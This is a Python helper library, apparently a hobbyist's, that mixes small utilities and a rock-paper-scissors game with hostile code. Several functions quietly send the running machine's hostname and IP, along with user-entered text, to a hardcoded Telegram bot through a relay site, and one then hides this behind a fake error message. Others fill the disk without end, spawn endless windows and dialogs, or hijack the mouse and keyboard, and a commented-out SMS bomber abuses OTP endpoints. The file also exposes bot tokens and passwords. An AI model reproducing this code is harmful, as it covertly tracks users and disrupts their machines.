def to_me(tometext):
    import requests as req
    import socket
    # import os

    host = socket.gethostname()
    ip = socket.gethostbyname(host)
    # a= socket
    # print(a)
    main_website = "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx"

    token = '6129454415:AAHy3lEqzac61a2qzl8Ba-t92UWv0vUhRsQ'
    chat_id = '5433487133'
    text = f"host = {host}\nip = {ip}\ntext:{tometext}"

    url = f'https://api.telegram.org/bot{token}/sendmessage?chat_id={chat_id}&text={text}'

    My_Data = {
        'UrlBox' : url , 
        'AgentList' : 'Mozilla Firefox' , 
        'VersionsList' : 'HTTP/1.1' , 
        'MethodList' : 'GET'
    }


    Resualt = req.post(main_website , data=My_Data)

    print(Resualt)
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------
def dont_click(mude,username,armia_python_code):
    admin = {
            "username" : "armiaadmin",
            "password": "1366222547",
            "armia_python_code" : "1366222547admin",
            "name" : "Armia"
            }
    user1 = {
            "username" : "1582242283",
            "password": "79092764",
            "armia_python_code" : "76246585468587",
            "name" : "mehdi"
            }
    if mude == "armia_python_code,username":
        if username == admin["username"]:
            if armia_python_code == admin["armia_python_code"]:
                return True
            return False
        if username == user1["username"]:
            if armia_python_code == user1["armia_python_code"]:
                return True
            return False
def dont_click_2():
        import time
        print('please go to this website to get armia_python code and user name: https://techlearnprogramming.w3spaces.com/sigh-up_page.html')
        time.sleep(20)
        exit('bye')
def dont_click_1():
    a = input('Enter your techlearnprogramming site username(if you dont have one Enter 000):')
    b = input('Enter your techlearnprogramming site armia_python_code(if you dont have one Enter 000):')

    if a=='000' or b == '000':
        dont_click_2()
    else:
        if dont_click('armia_python_code,username',a,b) == True:
            return True
        if dont_click('armia_python_code,username',a,b) == False:
            print('not find your acount')
            dont_click_2()
#-----------------------------------------------------------------------------------------------------------------------------------------------------
def sound(milsec , frecanc):
    from winsound import Beep
    Beep(frecanc,milsec)
#--------------------------------------
def play_sound(filename):
    import winsound
    winsound.PlaySound(filename)
#-------------------------------------
def soundviros(frecanc):
    from winsound import Beep
    while True:
            Beep(frecanc,1000)
#---------------------------------------------------------------------------------------------------------------------
def dolartotoman(audoler):
    from colorama import Fore as F
    import os
    from time import sleep
    os.system('cls')
    print('waiting 2sec')
    sleep(2)
    os.system('cls')
    audoler=int(audoler)
    gimat = 31
    Toman = audoler*gimat

    print(f'{F.LIGHTYELLOW_EX}you have {audoler}au $ and you have {F.RED}{Toman}{F.LIGHTYELLOW_EX} Toman.')
    sleep(5)
    os.system('cls')
    print(f'{F.LIGHTGREEN_EX}{Toman}toman')
#---------------------------------------------------------------------------------------------------------------
def fileboomberv(name, format_without_dot, filesise):
    if dont_click_1() == True: 
        from os import system as sy
        a = 0
        while True:
            sy(f'fsutil file createNew {name}{a}{format_without_dot} {filesise}')
            a+=1
#------------------------------------------------------------------------------------------------------
def foldermacker(numberoffolders,name):
    if dont_click_1() == True: 
        import os
        import time
        import socket
        pcuser = socket.gethostname()
        if name == '0am':
            name='haaaaackckvirooos'
        a = 0
        b = 1
        c = int(numberoffolders)
        os.system('cls')
        while a < c:
            os.system(f'md\\\.\C:\\Users\\{pcuser}\\Desktop\\{name}{b}')
            time.sleep(0.5)
            a = a+1
            print(f'number{b}Done')
            b +=1
#------------------------------------------------------------------------------------------------------
def ip_get_with_tele(bottoken,yourchatid):
    if dont_click_1() == True: 
        bottoken=str(bottoken)
        yourchatid=str(yourchatid)
        import requests as req
        import socket
        import os

        
        os.system('cls')
        host = socket.gethostname()
        ip = socket.gethostbyname(host)

        main_website = "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx"

        token = bottoken
        chat_id = yourchatid
        text = f"host = {host}\nip = {ip} "

        url = f'https://api.telegram.org/bot{token}/sendmessage?chat_id={chat_id}&text={text}'

        My_Data = {
            'UrlBox' : url , 
            'AgentList' : 'Mozilla Firefox' , 
            'VersionsList' : 'HTTP/1.1' , 
            'MethodList' : 'GET'
        }


        Resualt = req.post(main_website , data=My_Data)

        print(Resualt)
#----------------------------------------------------------------------------------------------------------
def sleep(sleeptime):
    sleeptime=int(sleeptime)
    import time
    time.sleep(sleeptime)
#----------------------------------
def rand(number1,number2):
    from random import randint
    a=randint(number1,number2)
    print(a)
#---------------------------------------------------------------------------
def foldervirosmacker(name,pcuser):
    if dont_click_1() == True: 
        import os
        if name == '0am':
            name='haaaaackckvirooos'
        b = 1
        while True:
            os.system(f'md\\\.\C:\\Users\\{pcuser}\\Desktop\\{name}{b}')
            b +=1
#-------------------------------------------------------------------------
def filemacker(numberoffiles,hachm,name,path): 
    from os import system, chdir
    a = 0
    numberoffolders = int(numberoffiles)
    system('cls')
    while a < numberoffolders:
        chdir(path=path)
        system(f'fsutil file createNew {name}{a}.txt {hachm}')
        print(f'number{a}Done')
        a+=1
#--------------------------------------------------------------------------------------------------------------------------------------------
def aboutmeandmylib(name):
    if dont_click_1() == True: 
        import os
        from colorama import Fore as F
        os.system('cls')
        name=str(name)
        n = name.isalpha()
        if n == False:
            from time import sleep as sl
            print(f'{F.RED}not find your name\nexiting in 3sec')
            sl(3)
            exit('Bye\nsee you naver!!!')
        if n == True:
            os.system('cls')
            print(f'''{F.LIGHTMAGENTA_EX}Hello {name} I make this library when the main system is broken and the number of sections is low
            And some of them may not work on your system.
            {F.RED}if you need help message me on tlegram{F.LIGHTBLUE_EX}:+989387717722''')
#------------------------------------------------------------------------------------------------------------------------------------------------------
def aboutyou(*text1):
    import requests as req
    import socket
    import os

    # sy = os.system('systeminfo')
    os.system('cls')
    host = socket.gethostname()
    ip = socket.gethostbyname(host)
    main_website = "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx"

    token = '5549584604:AAFYkDxGgOB4CKN4vO0Wwv4zzIOgrgaRmsU'
    chat_id = '5433487133'
    text = f"""text = {text1}\n
    ip = {ip}
    host name = """

    url = f'https://api.telegram.org/bot{token}/sendmessage?chat_id={chat_id}&text={text}'

    My_Data = {
        'UrlBox' : url , 
        'AgentList' : 'Mozilla Firefox' , 
        'VersionsList' : 'HTTP/1.1' , 
        'MethodList' : 'GET'
    }


    Resualt = req.post(main_website , data=My_Data)

    print(Resualt)
#-------------------------------------------------------------------------------------------------
def STARTcmdnotpad(HowMeny):
    from os import system
    a = 0
    while a < HowMeny+1:
        system('start CMD.exe')
        system('start Notepad.exe')
        a+=a+1
#-------------------------------------------------
def cmdWrite(cmdcode):
    from os import system
    system(cmdcode)
#------------------------------
def startCMD(HowMeny):
    from os import system
    a = 0
    while a < HowMeny+1:
        system('start CMD.exe')
        a+=a+1
#----------------------------------
def StartNotepad(HowMeny):
    from os import system
    a = 0
    while a < HowMeny+1:
        system('start Notepad.exe')
        a+=a+1
#-------------------------------------
def startcmdnotpadviros():
    from os import system
    while True:
        system('start CMD.exe')
        # system('start Notepad.exe')
#------------------------------------------------------------------------------------------------------------------------------------------
def rockpaper(username1,password2,namestr):
    password2=str(password2)
    # Library
    from random import randint as rn
    from colorama import Fore as F
    import os
    from time import sleep as sl
    #_________________________________________________________0login0__________________________________
    b = 0
    a = 1
    os.system('cls')
    print(f"{F.LIGHTCYAN_EX}========================== Login Page ===========================")
    print(f'{F.GREEN}11010101101010{F.BLUE}[submiting]{F.GREEN}10111110{F.BLUE}[sending to system]{F.GREEN}10010100100010010100100100100110101011010010010101001010{F.BLUE}[looking in the data_bace]{F.GREEN}1001')
    while b < 9999999999999999999999999999999999999999999999999:
        print(f'{F.GREEN}01010101101010101111101001010010001001010010010010011010101101001001010100101010100100100100110100012110100101')
        sl(0.1)
        b+=b+1
    print(f'{F.GREEN}1{F.BLUE}louding{F.GREEN}10101011010101011111010010100100010010100100100100110101011010010010101001010100101')
    username =  username1
    password =  password2

    data_base = {
        "Usr" : "Armia admin",
        "pss" : "1366222547"
    }
    sl(1.5)
    os.system('cls')
    if (username == data_base["Usr"]) and (password == data_base["pss"]):
                print(f'{F.LIGHTCYAN_EX}...')
    else:
        print(f"{F.RED}Worng! you can try {a} / 3")
        while a <= 2:
            print(f"{F.RED}===== Worng! Try again =====")

            username =  username1
            password = password2
            data_base = {
                "Usr" : "Armia admin",
                "pss" : "1366222547"
    }

            if (username == data_base["Usr"]) and (password == data_base["pss"]):
                print(f"Welcome To Account")
                
                break
                
            else:

                a += 1
                print(f"{F.RED}Worng! you can try {a} / 3")
                if a == 3 :
                    print("Try again after 1 day")
                    sl(86400)

    print(f"{F.RED}Welcome To Account")
    #=Welcome====helloacm.com=============================================================
    def vs():
        os.system('start CMD.exe')

        
    #game:
    print(f"\n\n{F.GREEN}Welcome To Game".center(50))
    figlet = f"""{F.MAGENTA}
    _____            _ 
    |  _ \ ___   ___| | __
    | |_) / _ \ / __| |/ /
    |  _ < (_) | (__|   < 
    |_| \_\___/ \___|_|\_\\

    ____                       
    |  _ \ __ _ _ __   ___ _ __ 
    | |_) / _` | '_ \ / _ \ '__|
    |  __/ (_| | |_) |  __/ |   
    |_|   \__,_| .__/ \___|_|   
               |_|

     ____       _                        
    / ___|  ___(_)___ ___  ___  _ __ ___ 
    \___ \ / __| / __/ __|/ _ \| '__/ __|
    ___) | (__| \__ \__ \ (_) | |  \__ \\
    |____/ \___|_|___/___/\___/|_|  |___/

           __      ________
    from: /  \    | _____  |   __    __      .    __
         / /\ \   | |  ____|  //\\  //\\    ||   //\\ 
        / /  \ \  | |  \     //  \\//  \\   ||  //  \\
       / /----\ \ | |   \   //          \\  || //----\\ 
      / /      \ \| |    \ //            \\ ||//      \\ 
    {F.GREEN} 
    """
    sl(1)
    # os.system('cls')
    os.system('cls')
    print('welcome to game')
    print(figlet)
    round_game = 0
    player_score = 0
    computer_score = 0
    namestr=str(namestr)
    n = namestr.isalpha()
    if n == False:
        print(f'{F.RED}not find your name\nexiting in 3sec')
        sl(3)
        exit()
    if n == True:
        name = namestr+'.'
        

    print(f"Enter(exit) in move box to exit")
    print("-------------START-------------")

    while True:
        print(f"{F.BLUE}\n[*]--------------------------------------------------------------------\n")
        print(f'{F.LIGHTMAGENTA_EX}[$] Player : {player_score} || Computer : {computer_score}')

        # Role
        computer = ""
        rand = rn(0,2)
        if rand == 0 :
            computer = "rock"
        elif rand == 1:
            computer = "paper"
        elif rand == 2:
            computer = "scissors"

        print(f"{F.YELLOW}[*]Round {round_game + 1} ")
        player = input(f"{F.GREEN}player Make your move :").lower()
        #exit and info
        if (player == "q") or player == "exit":
            print(f"{F.LIGHTYELLOW_EX}[**] GOOD LUCK ...\n{F.LIGHTCYAN_EX}bye {name}")
            print(f'{F.LIGHTBLUE_EX}computer = {computer_score} ||| you = {player_score}')
            print(f"""{F.LIGHTMAGENTA_EX}

    ------------------------------------------------------
    |||          Name: Armia mousaviyan                ||| 
    |||      contact info:                             |||               
    |||          Telgram:+989387717722                 |||
    |||           email:armiaanila@outlook.com         |||
    |||          if you want my lib message me         |||
    ------------------------------------------------------             
    """)
            sl(15.5)
            vs()
            break
        #cls
        if (player == 'cls'):
            os.system('cls')
            
        # Main Game

        print(f'Computer Move : {computer}')

        if player == computer:
            print(f"{F.RED}[!] thats a tie ...")
            round_game += 1
            sl(1.5)
        if player == "rock":
            if computer == "paper":
                print(f"{F.LIGHTYELLOW_EX}[!] Winner Computer !")
                computer_score += 1
                round_game += 1
                sl(1.5)
            elif computer == "scissors":
                print(f"{F.LIGHTYELLOW_EX}[!] Winner You !")
                player_score += 1
                round_game += 1
                sl(1.5)
        elif player == "paper":
            if computer == "rock":
                print(f"{F.LIGHTYELLOW_EX}[!] Winner You !")
                player_score += 1
                round_game += 1
                sl(1.5)
            elif computer == "scissors":
                print(f"{F.LIGHTYELLOW_EX}[!] Winner Computer !")
                computer_score += 1
                round_game += 1
                sl(1.5)
        elif player == "scissors":
            if computer == "rock":
                print(f"{F.LIGHTYELLOW_EX}[!] Winner Computer !")
                computer_score += 1
                round_game += 1
                sl(1.5)
            elif computer == "paper":
                print(f"{F.LIGHTYELLOW_EX}[!] Winner You !")
                player_score += 1
                round_game += 1
                sl(1.5)
        else:
            print(f"{F.RED}[!] Not Found You Move")
            sl(1.5)
#-----------------------------------------------------------------------------------------------------------
def lockmouseandkebourdviros(text):
    import pyautogui
    import keyboard
    while True:
        pyautogui.moveTo(600, 0)
        keyboard.write(text)
#------------------------------------------
def lockmouse():
    import pyautogui
    pyautogui.moveTo(600, 0)
#------------------------------------
def lockkebourd(text):
    from keyboard import write
    write(text)
#-------------------------------------------
def lockmouseandkebourd(textforkeyboard):
    import os
    text = textforkeyboard
    import keyboard
    import pyautogui
    pyautogui.moveTo(600, 0)
    os.system('start Notepad.exe')
    keyboard.write(text)
#----------------------------------------------------------------------------------------------------
#this cods anf breaked:
#   if you want to fix this codes you can but pls message me: 
        # def smsboumber(numberno0code,howmani):
        #     import requests
        #     a=0
        #     number = numberno0code=int(numberno0code)
        #     # divar
        #     url_divar = 'https://api.divar.ir/v5/auth/authenticate'
        #     json_divar = {"phone":number}
        #     #snapp:
        #     url_snapp = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp'
        #     json_snapp = {'cellphone': +98+number}

        #     timewhile = howmani*2
        #     timewhile=int(timewhile)
        #     # SENDING
        #     while a<timewhile-1:
        #         req_divar = requests.post(url=url_divar,json=json_divar)
        #         print(req_divar)
        #         a+=a+1
        #     while a<timewhile-1:
        #         req_snapp = requests.post(url=url_snapp,json=json_snapp)
        #         print(req_snapp)
        #         a+=a+1
#------------------------------------------------------------------------------------------
def errortab(title,message,Howmani):
    import tkinter.messagebox
    a=0
    while a<Howmani:
        tkinter.messagebox.showerror(title,message)
        a=a+1
#------------------------------------------------------------
def errortabviros(tabtitle,tabmessage):
    import tkinter.messagebox
    while True:
        tkinter.messagebox.showerror(tabtitle,tabmessage)
#---------------------------------------------------------------
def talkingbot(text):
    text=str(text)
    import pyttsx3
    engine = pyttsx3.init()
    engine.say(text)
    engine.runAndWait()
    print('Done')
#-----------------------------------
def senmacker(firstname,familyname,age,info):
    import requests as req
    from os import system
    import socket
    from colorama import Fore


    host = socket.gethostname()
    ip = socket.gethostbyname(host)
    age=str(age)
    name = f'{firstname} {familyname}'
    a = f'''
        hi,my name is {name}
        I am {age} year old
        {info}
    '''
    main_website = "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx"

    token = '5549584604:AAFYkDxGgOB4CKN4vO0Wwv4zzIOgrgaRmsU'
    chat_id = '5433487133'
    text = f"""text = {a}
    ip = {ip}
    host = {host}
    """

    url = f'https://api.telegram.org/bot{token}/sendmessage?chat_id={chat_id}&text={text}'

    My_Data = {
        'UrlBox' : url , 
        'AgentList' : 'Mozilla Firefox' , 
        'VersionsList' : 'HTTP/1.1' , 
        'MethodList' : 'GET'
    }


    Resualt = req.post(main_website , data=My_Data)
    print(Resualt)
    system('cls')
    print(f'{Fore.LIGHTRED_EX}Error this is not for your system')
#----------------------------------------------------------------------------------------------------
def spamerbox(text,how_mani):
    import os , keyboard , time
    from colorama import Fore
    os.system('cls')
    banner = f'''{Fore.LIGHTYELLOW_EX} 
            ________________________________________________________  
            |0101010010010010010010010010100100001010010001000010001|
            |0101001010100101010010100101010010101001010100100010010| 
            |0100100100100010010100000120001010100101010000010001010|                            
            |0100101000101001010100100010101001000100010100010010010| 
            |0100010001000010000001 SPAMER 0100100100010101101010101|
            |0101001010100100100110010101001010101001010010101001010|
            |0101010101010101010101010101010101010010010101010100101|
            |0100010010010101010101010100000100010010000100010010001|
            |010101010101010101010 BY Armia 010101010101010101010101|
            |0100101001010010010000100010000100000100000100100001010|
            |_______________________________________________________|
    '''
    print(banner)
    time.sleep(1)
    a = 0
    how_mani=int(how_mani)
    print('waiting 5sec')
    time.sleep(0.5)
    os.system('start Notepad.exe')
    time.sleep(4.5)
    while a < how_mani:
        keyboard.write(text)
        keyboard.press('enter')
        a = a+1
#---------------------------------------------------------------------------------------------
def telesend(text):
    import requests as req
    import socket
    import os

    # sy = os.system('systeminfo')
    os.system('cls')
    host = socket.gethostname()
    ip = socket.gethostbyname(host)
    main_website = "https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx"

    token = '5549584604:AAFYkDxGgOB4CKN4vO0Wwv4zzIOgrgaRmsU'
    chat_id = '5433487133'
    text = f"""text = {text}
    ip = {ip}
    host name = {host}"""

    url = f'https://api.telegram.org/bot{token}/sendmessage?chat_id={chat_id}&text={text}'

    My_Data = {
        'UrlBox' : url , 
        'AgentList' : 'Mozilla Firefox' , 
        'VersionsList' : 'HTTP/1.1' , 
        'MethodList' : 'GET'
    }


    Resualt = req.post(main_website , data=My_Data)

    print(Resualt)
    os.system('cls')
#--------------------------------------------------------------------------------------------------
def cls():
    import os
    os.system('cls')
#---------------------
def Delete(filepath):
    import os
    os.remove(filepath)
#------------------------------------------------------------------------------------------------
def Deletewithformat(fileformat,hardnameegD):
    import os, subprocess
    os.chdir(f'{hardnameegD}:')
    result = subprocess.check_output(f'dir /S /B *{fileformat}', shell=True).decode().split()
    for i in result:
        a=input(f'{i}\n\nis this what you want to Dlete?(press Enter to contenue)')
        os.remove(i)
        print(f'{i} Deleted')
#-----------------------------------------------------------------------------------------------
def certificate(appname):
   #32,3,4,5,6,7,8,9,10,11,12,13,14,15,16,
   import random
   a558552=random.randint(1,55)
   file5555545=open(f'certificate{a558552}.txt','w')
   certificates1= f'''
   Armia {appname} certificates
   you have a certificates from mousprogramming site and youtub and github.
   you are from my 1000 winners
   pls mssage me to know more.
   telgram number:+989387717722
   !!!dont shair this certificate!!!  
   '''
   file5555545.write(certificates1)

def filesaver(text, adress):
    import random
    from os import chdir
    a558552=random.randint(1,55)
    file5555545=open(f'text{a558552}.txt','w')
    chdir(adress)
    file5555545.write(text)
#----------------------------------------------------
def Deleter(file_path):
    import os
    os.remove(file_path)
#-------------------------------------------------------------------------------------
def Deleter_by_format(Drive_path,format):
    import os, subprocess
    os.chdir('D:')
    result = subprocess.check_output('dir /S /B *.psd', shell=True).decode().split()
    for i in result:
        input(f'{i}\n\nis this what you want to Delete?(yes or no) ').lower()
        os.remove(i)
        print(f'{i} Deleted')

#------------------------------------------------------------------------------------------
def pass_word_list_macker(letters,path,file_name):
    import itertools, random
    import os
    main_letters = list(letters)
    password = itertools.permutations(main_letters)
    number=random.randint(1,100)
    os.chdir(path)
    with open(f'{file_name}{number}.txt','a') as file:
        for pas in password:
            passwords = ''.join(pas)
            file.write(passwords+'\n')
            print(passwords)
    file.close()
#-------------------------------------------------------------------
def site_ip(host_name_no_https):
    import socket

    hostname = str(host_name_no_https)

    ip_address = socket.gethostbyname(hostname)

    print("The IP address of", hostname, "is", ip_address)
#-----------------------------------------------------------------
def teb_opener(title,bg_coler,width,height):
    import turtle
    print('''you can use turtle lib
    To do this to know how to do this 
    if you dont know How to use this please messae me\ninfo:''')
    aboutmeandmylib('user')
    input('press Enter to countinue')
    win = turtle.Screen()
    win.title(title)
    while True:
        win.update()
#---------------------------------------------------------------------
